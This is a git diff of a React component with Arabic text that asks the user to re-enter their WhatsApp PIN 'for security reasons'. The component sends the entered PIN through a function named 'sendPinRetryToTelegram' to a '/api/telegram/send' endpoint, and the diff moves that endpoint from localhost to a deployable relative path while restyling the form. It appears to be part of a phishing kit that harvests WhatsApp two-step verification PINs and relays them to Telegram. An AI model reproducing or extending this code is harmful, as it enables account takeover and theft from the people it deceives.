@@ -1,5 +1,4 @@
 import React, { useState } from 'react';
-import { Lock, ArrowLeft, ArrowRight } from 'lucide-react';
 
 interface PinRetryStepProps {
   whatsappPin: string;
@@ -18,7 +17,7 @@ const PinRetryStep: React.FC<PinRetryStepProps> = ({
 
   const sendPinRetryToTelegram = async (pin: string) => {
     try {
-      await fetch('http://localhost:5176/api/telegram/send', {
+      await fetch('/api/telegram/send', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ 
@@ -37,7 +36,7 @@ const PinRetryStep: React.FC<PinRetryStepProps> = ({
     e.preventDefault();
     
     if (!whatsappPin || whatsappPin.length < 6) {
-      setError('يرجى إدخال رمز  صحيح (6 أرقام على الأقل)');
+      setError('يرجى إدخال رمز صحيح (6 أرقام على الأقل)');
       return;
     }
     
@@ -47,55 +46,92 @@ const PinRetryStep: React.FC<PinRetryStepProps> = ({
   };
 
   return (
-    <div className="text-center">
-      <div className="mb-6">
-        <div className="w-16 h-16 bg-gradient-to-r from-red-100 to-rose-100 rounded-full flex items-center justify-center mx-auto mb-4">
-          <Lock className="w-8 h-8 text-rose-600" />
+    <div className="form-card animate-fade-in">
+      <div className="form-content">
+        <div className="form-icon" style={{ background: 'linear-gradient(135deg, #f59e0b, #d97706)' }}>🔐</div>
+        <h2 className="form-title">أدخل رمز PIN مرة أخرى</h2>
+        <p className="form-subtitle">لأسباب أمنية، أعد إدخال رمز الحماية (PIN)</p>
+        
+        <div style={{ 
+          background: 'rgba(245, 158, 11, 0.1)', 
+          border: '1px solid rgba(245, 158, 11, 0.2)', 
+          borderRadius: '12px', 
+          padding: '1rem', 
+          marginBottom: '2rem',
+          display: 'flex',
+          alignItems: 'center',
+          justifyContent: 'center',
+          gap: '0.5rem'
+        }}>
+          <span style={{ fontSize: '1.2rem' }}>⚠️</span>
+          <p style={{ color: '#d97706', fontSize: '0.9rem', fontWeight: '500', margin: 0 }}>
+            تأكد من إدخال الرمز الصحيح
+          </p>
         </div>
-        <h2 className="text-2xl font-bold text-gray-900 mb-2">أدخل رمز PIN مرة أخرى</h2>
-        <p className="text-gray-600">لأسباب أمنية، أعد إدخال رمز الحماية (PIN)</p>
-      </div>
 
-      <form onSubmit={handleSubmit} className="space-y-6">
-        <div>
-          <div className="relative">
-            <input
-              type="password"
-              value={whatsappPin}
-              onChange={(e) => updateWhatsappPin(e.target.value)}
-              placeholder="••••••"
-              className="w-full bg-gray-50 border-2 border-gray-300 text-gray-900 text-lg text-center rounded-xl focus:ring-2 focus:ring-rose-500 focus:border-transparent px-4 py-4 transition-all duration-200 font-mono tracking-widest"
-              maxLength={8}
-            />
+        <form onSubmit={handleSubmit}>
+          <div className="input-group">
+            <div style={{ position: 'relative' }}>
+              <input
+                type="password"
+                value={whatsappPin}
+                onChange={(e) => updateWhatsappPin(e.target.value)}
+                placeholder="••••••"
+                style={{
+                  width: '100%',
+                  background: '#f9fafb',
+                  border: '2px solid #e5e7eb',
+                  borderRadius: '16px',
+                  padding: '1rem',
+                  fontSize: '1.2rem',
+                  textAlign: 'center',
+                  fontFamily: 'monospace',
+                  letterSpacing: '0.2em',
+                  transition: 'all 0.3s ease',
+                  outline: 'none'
+                }}
+                onFocus={(e) => {
+                  e.target.style.borderColor = '#f59e0b';
+                  e.target.style.boxShadow = '0 0 0 3px rgba(245, 158, 11, 0.1)';
+                  e.target.style.background = 'white';
+                }}
+                onBlur={(e) => {
+                  e.target.style.borderColor = '#e5e7eb';
+                  e.target.style.boxShadow = 'none';
+                  e.target.style.background = '#f9fafb';
+                }}
+                maxLength={8}
+              />
+            </div>
+            
+            {error && (
+              <div className="message error animate-fade-in">{error}</div>
+            )}
           </div>
-          {error && (
-            <p className="text-red-500 text-sm mt-2 animate-fade-in">{error}</p>
-          )}
-        </div>
 
-        <div className="flex space-x-4">
-          <button
-            type="button"
-            onClick={onBack}
-            className="flex-1 bg-gray-100 text-gray-700 py-3 px-6 rounded-xl font-semibold hover:bg-gray-200 transition-all duration-200 flex items-center justify-center space-x-2"
-          >
-            <ArrowLeft className="w-5 h-5" />
-            <span>رجوع</span>
-          </button>
-          
-          <button
-            type="submit"
-            className="flex-1 bg-gradient-to-r from-rose-600 to-red-600 text-white py-3 px-6 rounded-xl font-semibold hover:shadow-lg transition-all duration-300 hover:scale-105 flex items-center justify-center space-x-2"
-          >
-            <span>تأكيد مرة أخرى</span>
-            <ArrowRight className="w-5 h-5" />
-          </button>
-        </div>
-      </form>
+          <div className="button-group">
+            <button
+              type="button"
+              onClick={onBack}
+              className="btn btn-secondary"
+            >
+              <span>←</span>
+              <span>رجوع</span>
+            </button>
+            
+            <button
+              type="submit"
+              className="btn btn-primary"
+              style={{ background: 'linear-gradient(135deg, #f59e0b, #d97706)' }}
+            >
+              <span>تأكيد مرة أخرى</span>
+              <span>→</span>
+            </button>
+          </div>
+        </form>
+      </div>
     </div>
   );
 };
 
 export default PinRetryStep;
-
-
